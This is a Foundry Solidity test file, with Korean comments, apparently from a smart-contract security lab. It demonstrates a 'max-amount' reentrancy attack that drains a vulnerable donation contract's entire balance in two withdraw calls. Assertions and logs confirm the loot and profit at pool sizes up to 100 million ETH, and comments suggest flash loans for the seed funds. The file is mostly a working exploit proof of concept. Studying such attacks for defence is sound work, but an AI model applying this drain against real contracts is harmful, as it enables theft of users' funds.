// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Reentrancy} from "../src/Reentrancy.sol";
import {ReentrancyAttackerMax} from "../src/ReentrancyAttackerMax.sol";

contract ReentrancyMaxTest is Test {
    Reentrancy reentrancy;
    address alice;
    address attackerEOA;

    function setUp() public {
        reentrancy = new Reentrancy();
        alice = makeAddr("alice");
        attackerEOA = makeAddr("attacker");
        vm.deal(alice, 10 ether);
        vm.deal(attackerEOA, 100 ether); // 시드(현실에선 flash loan)
    }

    /// @notice 피해자 잔액이 아무리 커도, 최대-금액 방식은 단 2번의 withdraw로 전액 탈취한다.
    function testDrainMax() public {
        uint256 victim = 5 ether;
        vm.prank(alice);
        reentrancy.donate{value: victim}(alice);

        // 공격자: 피해자 잔액(5)과 같은 시드 예치 → 1회 재진입으로 전액
        vm.prank(attackerEOA);
        ReentrancyAttackerMax atk = new ReentrancyAttackerMax(address(reentrancy));
        vm.prank(attackerEOA);
        atk.attack{value: victim}();

        assertEq(address(reentrancy).balance, 0, "contract not fully drained");
        assertEq(atk.calls(), 2, "should drain in exactly 2 withdraws");
        assertEq(address(atk).balance, victim * 2, "loot = own seed + victim funds");

        emit log_named_uint("withdraw calls", atk.calls());
        emit log_named_decimal_uint("loot (ether)", address(atk).balance, 18);
        emit log_named_decimal_uint("profit = victim funds (ether)", address(atk).balance - victim, 18);

        atk.collect();
    }

    /// @notice 피해자 잔액이 50 ETH로 커도 여전히 2번이면 끝난다(찔끔형은 가스로 ~270회에서 revert).
    function testDrainMaxLargePot() public {
        uint256 victim = 50 ether;
        vm.deal(alice, 60 ether);
        vm.prank(alice);
        reentrancy.donate{value: victim}(alice);

        vm.deal(attackerEOA, 60 ether);
        vm.prank(attackerEOA);
        ReentrancyAttackerMax atk = new ReentrancyAttackerMax(address(reentrancy));
        vm.prank(attackerEOA);
        atk.attack{value: victim}();

        assertEq(address(reentrancy).balance, 0);
        assertEq(atk.calls(), 2); // 깊이/가스 무관 — 잔액 크기와 호출 수가 분리됨
        assertEq(address(atk).balance, victim * 2);
    }

    // 임의 크기 풀을 시드 = 피해자잔액으로 전액 탈취. 반환: withdraw 호출 수.
    function _drainAny(uint256 pot) internal returns (uint256) {
        Reentrancy r = new Reentrancy();
        address victim = makeAddr("bigVictim");
        vm.deal(victim, pot);
        vm.prank(victim);
        r.donate{value: pot}(victim);

        ReentrancyAttackerMax a = new ReentrancyAttackerMax(address(r));
        vm.deal(address(this), pot); // 시드(현실=flash loan)
        a.attack{value: pot}();

        assertEq(address(r).balance, 0, "not fully drained");
        return a.calls();
    }

    /// @notice "얼마까지?" — 잔액이 100 / 100만 / 1억 ETH여도 항상 2번에 전액. 메커니즘에 한도 없음.
    function testDrainScalesUnbounded() public {
        uint256[3] memory pots = [uint256(100 ether), 1_000_000 ether, 100_000_000 ether];
        for (uint256 i = 0; i < pots.length; i++) {
            uint256 calls = _drainAny(pots[i]);
            emit log_named_decimal_uint("pot fully drained (ether)", pots[i], 18);
            emit log_named_uint("  withdraw calls", calls);
            assertEq(calls, 2, "should always be 2 regardless of size");
        }
    }
}
